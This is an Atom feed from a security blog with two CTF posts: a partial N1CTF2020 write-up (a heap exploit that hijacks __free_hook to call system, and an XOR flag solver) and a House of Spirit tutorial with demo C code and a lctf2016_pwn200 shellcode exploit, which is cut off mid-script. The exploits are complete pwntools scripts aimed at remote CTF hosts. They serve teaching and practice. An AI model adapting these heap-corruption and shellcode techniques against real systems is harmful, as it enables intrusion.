<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Chumen77&#39;s Blog</title>
  
  <subtitle>永远相信美好的事情即将发生！</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://chumen77.xyz/"/>
  <updated>2020-10-21T11:31:51.119Z</updated>
  <id>http://chumen77.xyz/</id>
  
  <author>
    <name>chumen77</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>N1CTF2020部分wp</title>
    <link href="http://chumen77.xyz/2020/10/19/N1CTF2020%E9%83%A8%E5%88%86wp/"/>
    <id>http://chumen77.xyz/2020/10/19/N1CTF2020部分wp/</id>
    <published>2020-10-19T09:18:47.650Z</published>
    <updated>2020-10-21T11:31:51.119Z</updated>
    
    <content type="html"><![CDATA[<h1 id="N1CTF2020部分wp"><a href="#N1CTF2020部分wp" class="headerlink" title="N1CTF2020部分wp"></a>N1CTF2020部分wp</h1><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>调试one gadget 花了近4小时。。😭</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>c++写的程序，存在add show del的功能，但是进入各自的函数看，看的是稀里糊涂的。个人发现的只是其按照自己的逻辑对内存块idx 1，2进行处理。</p><p>因为功能很简单，可以直接上手调试，来确定程序是如何运作的。</p><p>上手调试后会发现，其根据3个指针来对idx 1、2 处理。</p><h4 id="动调分析"><a href="#动调分析" class="headerlink" title="动调分析"></a>动调分析</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'ber'</span>,str(data))</code></pre></div><div class="hljs"><pre><code class="hljs python">add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)</code></pre></div><p>看下bss段0x2032a0的数据：</p><div class="hljs"><pre><code class="hljs python">pwndbg&gt;  x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x0002032A0</span> +<span class="hljs-number">0x555555554000</span><span class="hljs-number">0x5555557572a0</span>: <span class="hljs-number">0x0000555555769e70</span>      <span class="hljs-number">0x0000555555769e78</span><span class="hljs-number">0x5555557572b0</span>: <span class="hljs-number">0x0000555555769e78</span>      <span class="hljs-number">0x0000000000000000</span></code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/O7QsvP.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs python">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x555555769e60</span><span class="hljs-number">0x555555769e60</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000021</span><span class="hljs-number">0x555555769e70</span>: <span class="hljs-number">0x0000000000000001</span>      <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x555555769e80</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x000000000000f181</span></code></pre></div><p>再次：</p><div class="hljs"><pre><code class="hljs python">add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)</code></pre></div><p>看下bss段0x2032a0的数据：</p><div class="hljs"><pre><code class="hljs python">pwndbg&gt;  x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x0002032A0</span> +<span class="hljs-number">0x555555554000</span><span class="hljs-number">0x5555557572a0</span>: <span class="hljs-number">0x0000555555769e90</span>      <span class="hljs-number">0x0000555555769ea0</span><span class="hljs-number">0x5555557572b0</span>: <span class="hljs-number">0x0000555555769ea0</span>      <span class="hljs-number">0x0000000000000000</span></code></pre></div><div class="hljs"><pre><code class="hljs python">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x555555769e60</span><span class="hljs-number">0x555555769e60</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000021</span><span class="hljs-number">0x555555769e70</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x555555769e80</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000021</span><span class="hljs-number">0x555555769e90</span>: <span class="hljs-number">0x0000000000000001</span>      <span class="hljs-number">0x0000000000000002</span><span class="hljs-number">0x555555769ea0</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x000000000000f161</span></code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/t6qFSC.png" srcset="/img/loading.gif" alt></p><p>可以这样接着测试free 和 del的功能。</p><h4 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h4><p>重点就是bss段储存内存块 1 2 信息的3个指针。</p><h5 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h5><ul><li><p>指针1和3是一个边界指针，指针2是数据编辑指针。根据指针2处来写number数据，一次是8个字节，写完后，指针2会加8。</p></li><li><p>当指针2大小超过指针3，其就会申请一块新的内存，其申请完内存大小是以<code>0x20,0x20,0x30,0x50,0x90,0x110,0x210,0x410,0x810,0x1010</code> 这样递增。</p></li><li><p>申请完新内存，会把指针1对应的内存块进行free，也就是上一块chunk。并把上一块内存中的number值进行拷贝到新申请的内存中。并且会根据申请到的chunk地址，进行对bss段3个指针的更新。</p><h5 id="free函数"><a href="#free函数" class="headerlink" title="free函数"></a>free函数</h5></li><li><p>让指针2减8.</p><h5 id="show-函数"><a href="#show-函数" class="headerlink" title="show 函数"></a>show 函数</h5></li><li><p>打印出指针2减8后对应地址上的数据信息</p></li></ul><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><h4 id="idx-内存块1"><a href="#idx-内存块1" class="headerlink" title="idx 内存块1"></a>idx 内存块1</h4><ul><li><p>add到有0x1010 chunk块，其原来的0x810会放进unsortbin</p></li><li><p>free 多次，让指针2 指向0x810的fd或者bk处，利用show泄漏出libc地址</p></li><li><p>free 多次，让指针2指向0x20的fd处，进行tcache attack，修改其为free hook</p><h4 id="idx-内存块2"><a href="#idx-内存块2" class="headerlink" title="idx 内存块2"></a>idx 内存块2</h4></li><li><p>add数据，准备上free hook，上free hook 改free hook为one gadget</p></li><li><p>紧接着程序，就free 上一个chunk，就会触发free hook</p></li></ul><p>但是写完exp，会发现one gadget没有一个可以打通的，栈上存在很多数据，无法满足。尽管使用realloc进行栈帧调整，也没法子。</p><p>此时看一下寄存器上的信息，发现刚通过free hook跳转过去后，上面的rdi rsi什么的都指向了可控的heap段，那就修改思路，修改free hook 为system，<strong>并且提前修改其rdi指向heap段的数据，修改为<code>sh\x00</code></strong> 。这样再触发free hook就可以<code>system(sh)</code>了。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/WPo0kI.png" srcset="/img/loading.gif" alt></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./signin'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'47.242.161.199'</span>,<span class="hljs-number">9990</span>)    libc = elf.libc    <span class="hljs-comment"># libc = ELF('./libc.so')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]roc = [<span class="hljs-number">0</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0x8</span>,<span class="hljs-number">0x9</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'ber'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">258</span>):    add(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">458</span>+<span class="hljs-number">57</span>):    free(<span class="hljs-number">1</span>)show(<span class="hljs-number">1</span>)r()libc_base = int(r(<span class="hljs-number">15</span>),<span class="hljs-number">10</span>) - <span class="hljs-number">0x3ebca0</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">270</span>):    free(<span class="hljs-number">1</span>)info_addr(<span class="hljs-string">'libcbase'</span>,libc_base)free_hook = <span class="hljs-number">0x3ed8e8</span> + libc_baseadd(<span class="hljs-number">1</span>,<span class="hljs-number">33</span>)add(<span class="hljs-number">1</span>,free_hook<span class="hljs-number">-8</span>)system = libc.sym[<span class="hljs-string">'system'</span>] +libc_baseadd(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">2</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">26739</span>)add(<span class="hljs-number">2</span>,system)add(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>)itr()</code></pre></div><h2 id="oflo"><a href="#oflo" class="headerlink" title="oflo"></a>oflo</h2><p>存在花指令，无法正常反编译，直接可以用ida或者gdb进行跟即可。但是不能直接打开，会被反调试ptrace检测到，可以attach上去即可。<strong>（注意是root权限下。）</strong></p><p>开始程序让输入19个字符，关键代码在<code>0x400a69</code>,但是坏的机器码，gdb 下watch一下，发现有流程在根据你<strong>输入的东西</strong>处理这一块的机器码，输入正确了可以执行下去。在关键代码处，可以发现其是在处理14位的数据，但是刚开始输入的是19个，多出来的5个不知道什么用。调试会发现，其就根据前5个字节，对<code>0x400a69</code>块进行处理，一共处理了10次。可以猜到就是<code>n1ctf</code>。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/IBvReP.png" srcset="/img/loading.gif" alt></p><p>这块处理完其汇编代码，就正常了。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">13</span>; ++i ) &#123;   <span class="hljs-keyword">if</span> ( *(&amp;v4 + i) != ((*(<span class="hljs-keyword">char</span> *)(i + a1) + <span class="hljs-number">2</span>) ^ *(<span class="hljs-keyword">char</span> *)(i + a2)) )</code></pre></div><p>进入以后可以看到关键代码。其是在于起初程序，<code>cat /proc/version</code>到的字符串取前14个在进行xor。要是绕过这里，没有相应字符串，就会出现问题。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python">key = [<span class="hljs-number">0x35</span>,<span class="hljs-number">0x2D</span>,<span class="hljs-number">0x11</span>, <span class="hljs-number">0x1A</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x7D</span>,<span class="hljs-number">0x11</span>, <span class="hljs-number">0x14</span>,<span class="hljs-number">0x2B</span>,<span class="hljs-number">0x3B</span>,<span class="hljs-number">0x3E</span>,<span class="hljs-number">0x3D</span>,<span class="hljs-number">0x3C</span>,<span class="hljs-number">0x5F</span>]data = [<span class="hljs-number">0x4C</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x20</span>]flag = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(key)):    flag += chr(key[i] ^ (data[i]+<span class="hljs-number">2</span>))print(flag)</code></pre></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;N1CTF2020部分wp&quot;&gt;&lt;a href=&quot;#N1CTF2020部分wp&quot; class=&quot;headerlink&quot; title=&quot;N1CTF2020部分wp&quot;&gt;&lt;/a&gt;N1CTF2020部分wp&lt;/h1&gt;&lt;h2 id=&quot;signin&quot;&gt;&lt;a href=&quot;#sig
      
    
    </summary>
    
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="heap" scheme="http://chumen77.xyz/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>House of Spirit</title>
    <link href="http://chumen77.xyz/2020/10/09/House%20of%20Spirit/"/>
    <id>http://chumen77.xyz/2020/10/09/House of Spirit/</id>
    <published>2020-10-09T03:45:32.518Z</published>
    <updated>2020-10-10T06:41:06.995Z</updated>
    
    <content type="html"><![CDATA[<h1 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h1><p>House of Spirit（下面称为hos）是一个组合型漏洞的利用，是变量覆盖和堆管理机制的组合利用，<strong>关键在于能够覆盖一个堆指针变量，使其指向可控的区域</strong>，只要构造好数据，释放后系统会错误的将该区域作为堆块放到相应的fastbin里面，最后再分配出来的时候，就有可能改写我们目标区域（多为函数指针和<strong>返回地址</strong>）。</p><h2 id="核心条件"><a href="#核心条件" class="headerlink" title="核心条件"></a>核心条件</h2><ul><li>有机会覆盖一个堆指针变量，使其指向目标可控的区域</li><li>能够在目标可控位置处伪造 fastbin chunk</li></ul><p>这样将其这个堆指针释放，会放到相应的fastbin，从而达到分配指定地址的 chunk 的目的。</p><h3 id="fastbin-fake-chunk-需要绕过的检测"><a href="#fastbin-fake-chunk-需要绕过的检测" class="headerlink" title="fastbin fake chunk 需要绕过的检测"></a>fastbin fake chunk 需要绕过的检测</h3><ul><li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li><li>fake chunk 地址需要对齐， <code>MALLOC_ALIGN_MASK</code></li><li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li><li>fake chunk 的 <strong>next chunk</strong> 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> 。(这个大小还是很随意的，不必要非得是fastbin 的size 例如 :0x1234)</li><li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li></ul><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><div class="hljs"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"This file demonstrates the house of spirit attack.n"</span>);  <span class="hljs-comment">//调用一次malloc来初始化堆  </span>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Calling malloc() once so that it sets up its memory.n"</span>);    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">//现在我们将覆写一个指针来指向一个伪造的fastbin域</span>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"We will now overwrite a pointer to point to a fake 'fastbin' region.n"</span>);    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *a;  <span class="hljs-comment">//这个和fastbinY无关,不要被这个10所骗,fake_chunks只是一块内存</span>    <span class="hljs-comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> fake_chunks[<span class="hljs-number">10</span>] __attribute__ ((aligned (<span class="hljs-number">16</span>)));  <span class="hljs-comment">//这个域包含了两个chunk,第一个从fake_chunks[1]开始,另一个从fake_chunks[9]开始</span>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.n"</span>, <span class="hljs-keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="hljs-number">1</span>], &amp;fake_chunks[<span class="hljs-number">9</span>]);  <span class="hljs-comment">//这个chunk的size必须符和fastbin的要求(&lt;=128 x64位系统),PREV_INUSE位在fasybin-sized chunks中也是被忽略的,但是IS_MAPPED和NON_MAIN_AREN会引发一些问题</span>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.n"</span>);    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. n"</span>);    fake_chunks[<span class="hljs-number">1</span>] = <span class="hljs-number">0x40</span>; <span class="hljs-comment">// this is the size</span>  <span class="hljs-comment">//下一个fake chunk的size必须是合法的。 即&gt; 2 * SIZE_SZ（在x64上需要&gt; 16）和＆&lt;av-&gt; system_mem（对于main arena来说，默认为&lt;128kb）并且可以通过nextsize完整性检查。 但是我们无需符和Fastbin的大小</span>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.n"</span>);        <span class="hljs-comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span>    fake_chunks[<span class="hljs-number">9</span>] = <span class="hljs-number">0x1234</span>; <span class="hljs-comment">// nextsize</span>  <span class="hljs-comment">//现在我们将通过有着fake first chunks的fake区域地址来覆写我们的指针</span>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.n"</span>, &amp;fake_chunks[<span class="hljs-number">1</span>]);  <span class="hljs-comment">//要注意的是,chunk必须是16字节对齐的</span>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.n"</span>);    a = &amp;fake_chunks[<span class="hljs-number">2</span>];    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Freeing the overwritten pointer.n"</span>);    <span class="hljs-built_in">free</span>(a);  <span class="hljs-comment">//现在下一次的malloc就将会返回我们的fake chunk了</span>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!n"</span>, &amp;fake_chunks[<span class="hljs-number">1</span>], &amp;fake_chunks[<span class="hljs-number">2</span>]);    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"malloc(0x30): %pn"</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>));&#125;</code></pre></div><p>正常的hos是需要伪造两个chunk的。</p><div class="hljs"><pre><code class="hljs c">This file demonstrates the house of spirit attack.Calling malloc() once so that it sets up its memory.We will now overwrite a pointer to point to a fake 'fastbin' region.This region (memory of length: 80) contains two chunks. The first starts at 0x7ffe23a56258 and the second at 0x7ffe23a56298.This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffe23a56258.... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.Freeing the overwritten pointer.Now the next malloc will return the region of our fake chunk at 0x7ffe23a56258, which will be 0x7ffe23a56260!malloc(0x30): 0x7ffe23a56260</code></pre></div><p>程序首先初始化了一下堆,然后申请了两个变量,一个是我们即将攻击的变量 a,另一个是我们的<code>fake_chunks</code></p><p>程序先在<code>fake_chunks[1]</code>的地方也就是size域伪造了合法的size,0x40(满足fastbin size大小,与16字节对齐,标志位正确)</p><p>之后又在下一处伪造了第二个chunk,即从<code>fake_chunks[8]</code>开始的地方,这是为什么呢,因为我们第一个fake chunk的size伪造成了0x40,那么我们第二个chunk就需要在向下0x40的地方也就是<code>fake_chunks+8</code>的地方伪造第二个chunk。</p><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>使用该技术分配 chunk 到指定地址，使目标位置成为可控区域，关键是要能够修改指定地址的前后的内容，伪造出2个堆，使其可以绕过对应的检测。</p><p>还有就是要有办法覆盖堆指针，到目标地址。</p><h2 id="lctf2016-pwn200"><a href="#lctf2016-pwn200" class="headerlink" title="lctf2016_pwn200"></a><code>lctf2016_pwn200</code></h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul><li>开头不输入<code>\n</code>，填充48字符可以泄露出stack地址</li><li>有第一段可控的栈，且可以覆盖到heap ptr</li></ul><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sub_400A29</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+0h] [rbp-40h]</span>  <span class="hljs-keyword">char</span> *dest; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span>  dest = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>uLL);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"give me money~"</span>);  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x40</span>uLL);  <span class="hljs-built_in">strcpy</span>(dest, &amp;buf);  ptr = dest;  <span class="hljs-keyword">return</span> sub_4009C4();&#125;</code></pre></div><ul><li>一次只能申请一个堆，大小0-0x80,且先释放才能再次申请。</li></ul><p>保护情况，无任何保护，所以可以写shellcode，jmp 上去即可。</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>利用可控的栈，hos 在栈上fake 一个堆，保证可以改到ret address</li></ul><p>可以先看一下可控栈的内存情况,<strong>此前id输入的是65</strong>：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/Sy4TQJ.png" srcset="/img/loading.gif" alt><br>前0x40为可控区域，箭头指的方向是可以覆盖的堆指针，id的上方有一个ret address，其在输入3退出时可以跳转到。所以其为目标地址，其前面有可控的0x40的区域，后面也有一个id 0x8的可控区域，满足条件 开始构造：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/fO0l4K.png" srcset="/img/loading.gif" alt></p><p>这样free一下就会有个进入fastbin 在栈上的fake堆，申请上去即可修改到目标区域。</p><ul><li>修改ret addree为shellcode的地址。其可以在第一次让你输入时，放入栈中。</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn200'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26670</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'long'</span>,str(size))    sa(<span class="hljs-string">'me'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)shellcode = asm(shellcraft.sh())sa(<span class="hljs-string">'u'</span>,shellcode)ru(<span class="hljs-string">'\x05'</span>)leak_stack = uu64(r(<span class="hljs-number">6</span>))info_addr(<span class="hljs-string">'leak_stack'</span>,leak_stack)shellcode_addr = leak_stack - <span class="hljs-number">0x50</span><span class="hljs-comment"># debug()</span>sla(<span class="hljs-string">'id'</span>,<span class="hljs-string">'65'</span>)payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x41</span>) + p64(<span class="hljs-number">0</span>) + p64(leak_stack - <span class="hljs-number">0x90</span>)sa(<span class="hljs-string">'money'</span>,payload)free()payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(shellcode_addr)add(<span 